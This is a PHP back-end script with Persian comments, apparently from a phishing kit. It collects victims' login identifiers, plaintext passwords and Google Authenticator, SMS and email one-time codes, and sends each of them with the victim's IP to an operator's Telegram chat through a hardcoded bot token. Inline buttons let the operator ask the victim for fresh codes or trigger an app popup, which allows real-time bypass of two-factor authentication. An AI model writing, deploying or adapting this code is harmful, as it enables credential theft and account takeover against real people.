<?php
// [مهم] مسیر پوشه ای که فایل های msgid, msgtext و command در آن ذخیره می شوند
define('COMMAND_DIR', '/home/booksqui/command_files/'); // <<-- مسیر شما با اسلش انتهایی

// اطمینان از وجود پوشه و قابل نوشتن بودن آن
if (!is_dir(COMMAND_DIR) || !is_writable(COMMAND_DIR)) {
    error_log("telegram_handler Critical Error: Command directory issue: " . COMMAND_DIR);
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(500);
    }
    echo json_encode(['status' => 'error', 'message' => 'Server configuration error (command dir).']);
    exit;
}

// --- تنظیمات ربات تلگرام ---
$botToken = "5552889968:AAHoZ28xu83J-jVp0lCeuNJyShbzZG9WLfc"; // <<-- توکن شما
$chatId = "-1001999042119";     // <<-- شناسه چت شما

// --- توابع کمکی برای فایل ---
function getFilePath($sessionId, $type) {
    $safeSessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
    if (empty($safeSessionId)) { error_log("getFilePath Error: Invalid or empty session ID provided."); return null; }
    $safeType = preg_replace('/[^a-zA-Z0-9]/', '', $type);
    if (empty($safeType)) { error_log("getFilePath Error: Invalid or empty file type provided."); return null; }
    $dir = rtrim(COMMAND_DIR, '/') . '/';
    return $dir . $safeSessionId . '.' . $safeType;
}
function saveDataToFile($sessionId, $type, $data) {
    $filePath = getFilePath($sessionId, $type);
    if ($filePath) {
        if (file_put_contents($filePath, $data, LOCK_EX) !== false) { @chmod($filePath, 0660); return true; }
        else { error_log("Error writing to file: " . $filePath . " (Session: $sessionId, Type: $type)"); }
    } else { error_log("Failed to save data: Could not generate file path for Session: $sessionId, Type: $type"); }
    return false;
}
function readDataFromFile($sessionId, $type) {
    $filePath = getFilePath($sessionId, $type);
    if ($filePath && file_exists($filePath) && is_readable($filePath)) {
        $content = @file_get_contents($filePath);
        if ($content !== false) { return trim($content); }
        else { error_log("Error reading file content from: " . $filePath); }
    }
    return null;
}
function deleteFile($sessionId, $type) {
     $filePath = getFilePath($sessionId, $type);
     if ($filePath && file_exists($filePath)) {
         if (@unlink($filePath)) { return true; }
         else { error_log("Failed to delete file: " . $filePath); return false; }
     }
     return false;
}

// --- توابع API تلگرام ---
function sendMessageToTelegram($botToken, $chatId, $message, $keyboard = null) {
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    $postFields = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true];
    if ($keyboard && is_array($keyboard) && !empty($keyboard)) {
        $replyMarkup = json_encode(['inline_keyboard' => $keyboard]);
        if ($replyMarkup) { $postFields['reply_markup'] = $replyMarkup; }
        else { error_log("sendMessageToTelegram Error: Failed to encode keyboard JSON."); }
    }
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curlError = curl_error($ch); curl_close($ch);
    if ($curlError) { error_log("Telegram sendMessage cURL Error: " . $curlError); return null; }
    if ($httpcode == 200 && $output) { $response = json_decode($output, true); if (isset($response['ok']) && $response['ok'] && isset($response['result']['message_id'])) { return $response['result']['message_id']; } else { error_log("Telegram sendMessage API Error: HTTP $httpcode, Response: " . $output); } } else { error_log("Telegram sendMessage HTTP Error: Code $httpcode, Response: " . $output); } return null;
}
function editMessageTextInTelegram($botToken, $chatId, $messageId, $newMessage, $keyboard = null) {
    $url = "https://api.telegram.org/bot" . $botToken . "/editMessageText";
    $postFields = ['chat_id' => $chatId, 'message_id' => $messageId, 'text' => $newMessage, 'parse_mode' => 'HTML'];
    // **تغییر:** اجازه دادن به ارسال کیبورد خالی برای حذف دکمه‌ها
    if (is_array($keyboard)) { // Note: An empty array [] will remove the keyboard
        $replyMarkup = json_encode(['inline_keyboard' => $keyboard]);
         if ($replyMarkup) { $postFields['reply_markup'] = $replyMarkup; }
         else { error_log("editMessageTextInTelegram Error: Failed to encode keyboard JSON."); /* Decide handling */ }
    } // If $keyboard is null, reply_markup is not sent, preserving existing keyboard (if any)

    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curlError = curl_error($ch); curl_close($ch);
    if ($curlError) { error_log("Telegram editMessageText cURL Error: " . $curlError . " for Message ID: $messageId"); return false; } $editedSuccessfully = false;
    if ($httpcode == 200 && $output) { $response = json_decode($output, true); if (isset($response['ok']) && $response['ok']) { $editedSuccessfully = true; } else if (isset($response['description'])) { if (strpos($response['description'], 'message is not modified') !== false) { $editedSuccessfully = true; } else { error_log("Telegram API error editing message $messageId: " . $response['description'] . " | Response: " . $output); } } else { error_log("Telegram editMessageText failed (HTTP 200 but OK false/missing): Response: " . $output . " for Message ID: $messageId"); } } else { error_log("Telegram editMessageText HTTP Error: Code $httpcode, Response: " . $output . " for Message ID: $messageId"); } return $editedSuccessfully;
}

// --- پردازش درخواست ---
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    if (!headers_sent()) { header('Content-Type: application/json; charset=utf-8'); }
    $sessionId = isset($_POST['session_id']) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['session_id']) : null;
    $dataType = isset($_POST['dataType']) ? trim($_POST['dataType']) : '';
    $ipAddress = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
    $currentTime = date('Y-m-d H:i:s');
    $shortTime = date('H:i:s');

    if (empty($sessionId)) { error_log("telegram_handler: Session ID missing or invalid."); if (!headers_sent()) { http_response_code(400); } echo json_encode(['status' => 'error', 'message' => 'Session ID missing or invalid']); exit; }
    if (empty($dataType)) { error_log("telegram_handler: dataType missing for Session: $sessionId"); if (!headers_sent()) { http_response_code(400); } echo json_encode(['status' => 'error', 'message' => 'Data type missing']); exit; }

    error_log("telegram_handler: Processing request - Session: $sessionId, DataType: $dataType, IP: $ipAddress");

    $messageText = ""; $newMessageId = null; $edited = false;
    $existingMessageId = readDataFromFile($sessionId, 'msgid');
    $currentKeyboard = null; // پیش‌فرض: بدون کیبورد

    // --- تعریف کیبوردها ---
     $actionKeyboard = [
         [['text' => '🔄 Request GA Again', 'callback_data' => 'request_ga_code:' . $sessionId]],
         [['text' => '✉️ Request Email Again', 'callback_data' => 'request_email_code:' . $sessionId]],
         [['text' => '⚠️ Wrong Info (Pwd/2FA)', 'callback_data' => 'wrong_info:' . $sessionId]],
         [['text' => '❗ Wrong Sms', 'callback_data' => 'wrong_sms:' . $sessionId]],
         [['text' => '📱 Show App Popup', 'callback_data' => 'request_app_popup:' . $sessionId]]
     ];
     $smsFinalKeyboard = $actionKeyboard;

    // --- تابع کمکی برای ساخت متن پایه پیام (اصلاح شده برای حفظ تاریخچه) ---
    function getBaseMessageText($sessionId, $existingMessageId, $ipAddress) {
         $previousText = readDataFromFile($sessionId, 'msgtext');
         $baseText = "⚠️ Error reconstructing message.\nSession: <code>" . htmlspecialchars($sessionId) . "</code>\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>"; // Fallback

         if ($previousText !== null) {
              // **تغییر: پیدا کردن آخرین جداکننده برای حفظ تاریخچه**
              $separatorPos = strrpos($previousText, "\n--------------------");

              if ($separatorPos !== false) {
                  // متن قبلی تا قبل از جداکننده را نگه دار
                  $baseText = trim(substr($previousText, 0, $separatorPos));
              } else {
                  // اگر جداکننده نبود (نباید اتفاق بیفتد)، کل متن قبلی را برگردان
                  $baseText = trim($previousText);
                  error_log("getBaseMessageText: Separator not found, returning full previous text for session: $sessionId");
              }
         } else {
              error_log("getBaseMessageText: Previous message text not found for session: $sessionId (Expected MsgID: $existingMessageId)");
         }
         return $baseText;
    }

    // --- پردازش بر اساس نوع داده ---
    switch ($dataType) {
        case 'password_login':
            $emailOrMobile = isset($_POST['email']) ? trim($_POST['email']) : 'N/A';
            // ⚠️ دریافت پسورد واقعی - هشدار امنیتی! ⚠️
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            $twoFactorCodeOptional = isset($_POST['two_factor_code_optional']) ? trim($_POST['two_factor_code_optional']) : '';

            deleteFile($sessionId, 'command'); deleteFile($sessionId, 'msgid'); deleteFile($sessionId, 'msgtext'); deleteFile($sessionId, 'useridentifier'); deleteFile($sessionId, 'gacount'); deleteFile($sessionId, 'emailcount');
            saveDataToFile($sessionId, 'useridentifier', $emailOrMobile); saveDataToFile($sessionId, 'gacount', '0'); saveDataToFile($sessionId, 'emailcount', '0');

            $statusText = ""; $detailsText = ""; $messageTitle = "";
            $displayIdentifier = htmlspecialchars($emailOrMobile);
            $displayPassword = htmlspecialchars($password);

            // **تغییر ۱: ارسال پسورد واقعی**
            $detailsText .= "Account: " . $displayIdentifier . "\n";
            $detailsText .= "Password: <code>" . $displayPassword . "</code>\n"; // <-- پسورد واقعی

            if ($twoFactorCodeOptional && preg_match('/^\d{6}$/', $twoFactorCodeOptional)) {
                $messageTitle = "<b>✅ PWD + Optional 2FA Received</b>";
                $detailsText .= "Optional 2FA: <code>" . htmlspecialchars($twoFactorCodeOptional) . "</code>\n";
                $statusText = "ℹ️ Status: Login attempt with optional 2FA. Admin action required.";
                $currentKeyboard = $actionKeyboard; // <<-- نمایش کیبورد
            } else {
                $messageTitle = "<b>🔑 Password Attempt Received</b>";
                $detailsText .= "Optional 2FA: <code>[Not Provided]</code>\n";
                $statusText = "ℹ️ Status: Initial login attempt. Admin action required.";
                 $currentKeyboard = $actionKeyboard; // <<-- نمایش کیبورد برای اقدام اولیه ادمین
            }
            // **تغییر ۱ (ادامه): ساخت پیام کامل با اطلاعات واقعی**
            $messageText = $messageTitle . "\n\n" . $detailsText . "\n" . $statusText . "\n" . "<code>Login Time: " . $currentTime . "</code>";
            // جداکننده و اطلاعات IP/Session در انتها
            $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
            $fullMessageToSend = $messageText . $footer;

            $newMessageId = sendMessageToTelegram($botToken, $chatId, $fullMessageToSend, $currentKeyboard); // ارسال پیام با کیبورد
            if ($newMessageId) { saveDataToFile($sessionId, 'msgid', $newMessageId); saveDataToFile($sessionId, 'msgtext', $fullMessageToSend); } // ذخیره پیام کامل
            else { error_log("Failed to send initial password login message for session: $sessionId"); }
            break;

        case 'google_auth_code':
            $gaCode = isset($_POST['code']) ? trim($_POST['code']) : '';
            if ($existingMessageId && preg_match('/^\d{6}$/', $gaCode)) {
                $baseText = getBaseMessageText($sessionId, $existingMessageId, $ipAddress); // دریافت متن قبلی تا جداکننده
                $gaCodeCount = ((int) readDataFromFile($sessionId, 'gacount')) + 1; saveDataToFile($sessionId, 'gacount', (string) $gaCodeCount);
                // **تغییر ۱: ساخت بلاک کد جدید**
                $newCodeInfo = "\n\n--- Google Auth Update ---\n" . "GA Code (#". $gaCodeCount ."): <code>" . htmlspecialchars($gaCode) . "</code> ✅\n" . "<code>Received: " . $shortTime . "</code>";
                // **تغییر ۲: بهبود متن Status**
                $statusLine = "✅ Status: GA Code (#$gaCodeCount) received. Admin action required.";
                $currentKeyboard = $actionKeyboard; // نمایش کیبورد
                // **تغییر ۱: ضمیمه کردن کد جدید و وضعیت جدید به متن قبلی**
                $messageText = $baseText . $newCodeInfo . "\n\n" . $statusLine;
                $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
                $fullMessageToEdit = $messageText . $footer;

                $edited = editMessageTextInTelegram($botToken, $chatId, $existingMessageId, $fullMessageToEdit, $currentKeyboard);
                if ($edited) { saveDataToFile($sessionId, 'msgtext', $fullMessageToEdit); } // ذخیره متن ویرایش شده کامل
                else { error_log("Failed edit for GA code, session: $sessionId, msgId: $existingMessageId"); }
            } else { /* Error handling */ }
            break;

        case 'mobile_sent':
            $mobile = isset($_POST['mobile']) ? preg_replace('/[^0-9]/', '', $_POST['mobile']) : '';
            $isResend = isset($_POST['resend']) && $_POST['resend'] == 'true';
            if (strlen($mobile) !== 11) { error_log("Invalid mobile number format: '$mobile' for session: $sessionId"); break; }
            $displayMobile = htmlspecialchars($mobile);
            if ($isResend) {
                 if ($existingMessageId) {
                    $baseText = getBaseMessageText($sessionId, $existingMessageId, $ipAddress); // دریافت متن قبلی
                    $statusLine = "🔄 Status: SMS verification code resent. Waiting for user to enter code.";
                    $currentKeyboard = null; // بدون کیبورد
                    // **تغییر ۱: اضافه کردن وضعیت جدید**
                    $messageText = $baseText . "\n\n" . $statusLine;
                    $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
                    $fullMessageToEdit = $messageText . $footer;
                    $edited = editMessageTextInTelegram($botToken, $chatId, $existingMessageId, $fullMessageToEdit, $currentKeyboard); // ویرایش بدون کیبورد
                    if ($edited) saveDataToFile($sessionId, 'msgtext', $fullMessageToEdit); else error_log("Failed edit for mobile resend, session: $sessionId, msgId: $existingMessageId");
                 } else { error_log("Cannot process mobile resend: Existing message ID not found for session: $sessionId"); }
            } else {
                deleteFile($sessionId, 'command'); deleteFile($sessionId, 'msgid'); deleteFile($sessionId, 'msgtext'); deleteFile($sessionId, 'useridentifier'); deleteFile($sessionId, 'gacount'); deleteFile($sessionId, 'emailcount');
                saveDataToFile($sessionId, 'useridentifier', $mobile); saveDataToFile($sessionId, 'gacount', '0'); saveDataToFile($sessionId, 'emailcount', '0');
                $title = "<b>📱 Mobile Login [1/2]</b>"; $details = "Mobile: " . $displayMobile . "\n";
                $statusLine = "ℹ️ Status: SMS code requested. Waiting for user to enter code.";
                $currentKeyboard = null; // <<-- پیام اولیه موبایل بدون کیبورد
                $messageText = $title . "\n\n" . $details . "\n" . $statusLine . "\n" . "<code>Login Time: " . $currentTime . "</code>";
                $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
                $fullMessageToSend = $messageText . $footer;
                $newMessageId = sendMessageToTelegram($botToken, $chatId, $fullMessageToSend, $currentKeyboard);
                if ($newMessageId) { saveDataToFile($sessionId, 'msgid', $newMessageId); saveDataToFile($sessionId, 'msgtext', $fullMessageToSend); } else { error_log("Failed send initial mobile login message for session: $sessionId"); }
            }
            break;

        case 'verification_code': // SMS verification code
            $smsCode = isset($_POST['code']) ? trim($_POST['code']) : '';
            if ($existingMessageId && preg_match('/^\d{6}$/', $smsCode)) {
                 $baseText = getBaseMessageText($sessionId, $existingMessageId, $ipAddress); // دریافت متن قبلی
                 $newCodeInfo = "\n\n--- SMS Code Update ---\n" . "SMS Code: <code>" . htmlspecialchars($smsCode) . "</code> ✅\n" . "<code>Received: " . $shortTime . "</code>";
                 $statusLine = "💬 Status: SMS code received. Admin action required.";
                 $currentKeyboard = $smsFinalKeyboard; // <<-- نمایش کیبورد
                 // **تغییر ۱: ضمیمه کردن کد و وضعیت جدید**
                 $messageText = $baseText . $newCodeInfo . "\n\n" . $statusLine;
                 $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
                 $fullMessageToEdit = $messageText . $footer;
                 $edited = editMessageTextInTelegram($botToken, $chatId, $existingMessageId, $fullMessageToEdit, $currentKeyboard);
                 if ($edited) { saveDataToFile($sessionId, 'msgtext', $fullMessageToEdit); } else { error_log("Failed edit for SMS code, session: $sessionId, msgId: $existingMessageId"); }
            } else { /* Error handling */ }
            break;

        case 'email_auth_code':
            $emailCode = isset($_POST['code']) ? trim($_POST['code']) : '';
            if ($existingMessageId && preg_match('/^\d{6}$/', $emailCode)) {
                $baseText = getBaseMessageText($sessionId, $existingMessageId, $ipAddress); // دریافت متن قبلی
                $emailCodeCount = ((int) readDataFromFile($sessionId, 'emailcount')) + 1; saveDataToFile($sessionId, 'emailcount', (string) $emailCodeCount);
                $newCodeInfo = "\n\n--- Email Code Update ---\n" . "Email Code (#". $emailCodeCount ."): <code>" . htmlspecialchars($emailCode) . "</code> ✅\n" . "<code>Received: " . $shortTime . "</code>";
                $statusLine = "✉️ Status: Email Code (#$emailCodeCount) received. Admin action required.";
                $currentKeyboard = $actionKeyboard; // <<-- نمایش کیبورد
                 // **تغییر ۱: ضمیمه کردن کد و وضعیت جدید**
                $messageText = $baseText . $newCodeInfo . "\n\n" . $statusLine;
                $footer = "\n--------------------\nIP: <code>" . htmlspecialchars($ipAddress) . "</code>\nSession: <code>" . htmlspecialchars($sessionId) . "</code>";
                $fullMessageToEdit = $messageText . $footer;
                $edited = editMessageTextInTelegram($botToken, $chatId, $existingMessageId, $fullMessageToEdit, $currentKeyboard);
                if ($edited) { saveDataToFile($sessionId, 'msgtext', $fullMessageToEdit); } else { error_log("Failed edit for Email code, session: $sessionId, msgId: $existingMessageId"); }
            } else { /* Error handling */ }
            break;

        default:
             error_log("Unknown dataType received: '$dataType' for session: $sessionId");
             if (!headers_sent()) { http_response_code(400); } echo json_encode(['status' => 'error', 'message' => 'Unknown data type provided.']); exit;
    }

    // --- پاسخ نهایی به AJAX (بدون تغییر منطقی نسبت به قبل) ---
    $operationSucceeded = false;
    switch ($dataType) {
        case 'password_login': $operationSucceeded = ($newMessageId !== null); break;
        case 'mobile_sent': $isResend = isset($_POST['resend']) && $_POST['resend'] == 'true'; $mobileCheck = isset($_POST['mobile']) ? preg_replace('/[^0-9]/', '', $_POST['mobile']) : ''; if ($isResend) { $operationSucceeded = $existingMessageId ? $edited : false; } elseif (strlen($mobileCheck) !== 11) { $operationSucceeded = false; } else { $operationSucceeded = ($newMessageId !== null); } break;
        case 'google_auth_code': case 'verification_code': case 'email_auth_code': $operationSucceeded = $existingMessageId ? $edited : false; break;
    }
    if ($operationSucceeded) { echo json_encode(['status' => 'success', 'message' => "Data processed for $dataType."]); }
    else { $errorMsg = "An unspecified error occurred processing the request."; $isResend = isset($_POST['resend']) && $_POST['resend'] == 'true'; $mobileCheck = isset($_POST['mobile']) ? preg_replace('/[^0-9]/', '', $_POST['mobile']) : ''; if ($dataType == 'password_login' || ($dataType == 'mobile_sent' && !$isResend && strlen($mobileCheck) === 11)) { $errorMsg = "Failed to send initial $dataType message to Telegram."; error_log("AJAX Response: Failed initial send for $dataType, session: $sessionId. newMessageId was null."); } elseif ($dataType == 'mobile_sent' && !$isResend && strlen($mobileCheck) !== 11) { $errorMsg = "Invalid mobile number format provided."; error_log("AJAX Response: Invalid mobile format for mobile_sent, session: $sessionId."); } elseif ($dataType == 'google_auth_code' || $dataType == 'verification_code' || $dataType == 'email_auth_code' || ($dataType == 'mobile_sent' && $isResend)) { if (!$existingMessageId) { $errorMsg = "Original Telegram message context lost for $dataType update."; error_log("AJAX Response: msgid missing for $dataType update, session: $sessionId"); } elseif (!$edited) { $errorMsg = "Failed to update Telegram message after receiving $dataType."; error_log("AJAX Response: Edit failed or message invalid for $dataType update, session: $sessionId"); } } else { error_log("AJAX Response: Unspecified error condition for $dataType, session: $sessionId"); } if (!headers_sent()) { http_response_code(500); } echo json_encode(['status' => 'error', 'message' => $errorMsg]); }

} else { // Handle non-POST requests
    if (!headers_sent()) { header("HTTP/1.1 405 Method Not Allowed"); header("Allow: POST"); header('Content-Type: application/json; charset=utf-8'); }
    echo json_encode(['status' => 'error', 'message' => 'Method Not Allowed. Only POST requests are accepted.']);
}
?>